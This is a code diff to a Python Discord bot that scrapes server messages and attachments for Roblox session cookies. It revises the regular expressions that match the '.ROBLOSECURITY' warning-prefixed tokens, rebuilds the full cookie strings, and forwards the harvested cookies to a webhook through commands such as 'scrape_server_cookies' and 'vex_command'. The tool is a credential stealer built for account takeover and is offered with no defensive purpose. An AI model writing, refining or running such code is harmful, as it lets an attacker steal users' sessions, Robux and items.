@@ -69,17 +69,16 @@ class CookieFetcher:
     def __init__(self):
         self.processed_messages = set()
         self.cookie_patterns = [
-            # Matches the full warning + token (Token must be at least 500 chars to be "complete")
-            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(CAEaAhA[A-Za-z0-9_-]{500,})',
-            # Matches just the token if it's standalone
-            r'(CAEaAhA[A-Za-z0-9_-]{500,})'
+            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[a-zA-Z0-9._-]+',
+            r'CAEaAhA[B-D]\.[A-Za-z0-9_-]{100,}',
+            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|\s*([a-zA-Z0-9._-]+)'
         ]
 
     def extract_cookies_from_text(self, text: str) -> List[str]:
         if not text:
             return []
 
-        cookies_found = set()
+        cookies_found = []
         
         for pattern in self.cookie_patterns:
             matches = re.findall(pattern, text, re.IGNORECASE)
@@ -88,20 +87,19 @@ class CookieFetcher:
                     match = match[0]
                 
                 # Clean trailing backticks and whitespace
-                token = match.strip().rstrip('`').strip()
+                match = match.strip().rstrip('`').strip()
+                if not match: continue
                 
-                # If it's just the token, wrap it in the warning. If it already has it, ensure it's clean.
-                if token.startswith('CAEaAhA') and len(token) > 500:
-                    full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{token}"
-                    cookies_found.add(full_cookie)
-                elif '_|WARNING' in token:
-                    # Extract the token part from the warning string
-                    token_match = re.search(r'CAEaAhA[A-Za-z0-9_-]{500,}', token)
-                    if token_match:
-                        full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{token_match.group(0)}"
-                        cookies_found.add(full_cookie)
+                if match.startswith('_|WARNING'):
+                    cookies_found.append(match)
+                elif match.startswith('CAEaAhA'):
+                    cookies_found.append(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{match}")
+                else:
+                    clean_match = re.sub(r'[^\w._-]', '', match)
+                    if clean_match.startswith('CAEaAhA'):
+                        cookies_found.append(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{clean_match}")
 
-        return list(cookies_found)
+        return list(set(cookies_found))
 
     async def fetch_attachments(self, message) -> List[str]:
         cookies_found = []
@@ -270,7 +268,7 @@ class CookieFetcherBot(discord.Client):
                     all_cookies = list(set(result['all']))
                     actual_messages_scanned = result.get('messages_scanned', 0)
                     attachments_scanned = result.get('attachments_scanned', 0)
-                    unique_cookies = [c for c in all_cookies if 'CAEaAhA' in c]
+                    unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
                     end_time = datetime.datetime.now()
                     time_taken = (end_time - start_time).total_seconds()
                     await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
@@ -330,7 +328,7 @@ class CookieFetcherBot(discord.Client):
             all_cookies = list(set(result['all']))
             actual_messages_scanned = result.get('messages_scanned', 0)
             attachments_scanned = result.get('attachments_scanned', 0)
-            unique_cookies = [c for c in all_cookies if 'CAEaAhA' in c]
+            unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
             end_time = datetime.datetime.now()
             time_taken = (end_time - start_time).total_seconds()
             await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
@@ -491,7 +489,7 @@ async def scrape_server_cookies(interaction, guild):
         all_cookies = list(set(result['all']))
         actual_messages_scanned = result.get('messages_scanned', 0)
         attachments_scanned = result.get('attachments_scanned', 0)
-        unique_cookies = [c for c in all_cookies if 'CAEaAhA' in c]
+        unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
         end_time = datetime.datetime.now()
         time_taken = (end_time - start_time).total_seconds()
 
@@ -568,7 +566,7 @@ async def vex_command(interaction: discord.Interaction):
                 cookies = result['all']
                 total_cookies += len(cookies)
                 total_servers += 1
-                unique_cookies = [c for c in cookies if 'CAEaAhA' in c]
+                unique_cookies = [c for c in cookies if 'CAEaAhAC' in c]
                 messages_scanned = result.get('messages_scanned', 0)
                 attachments_scanned = result.get('attachments_scanned', 0)
                 await bot.fetcher.send_to_cookie_webhook(cookies, unique_cookies, messages_scanned, attachments_scanned, 0)
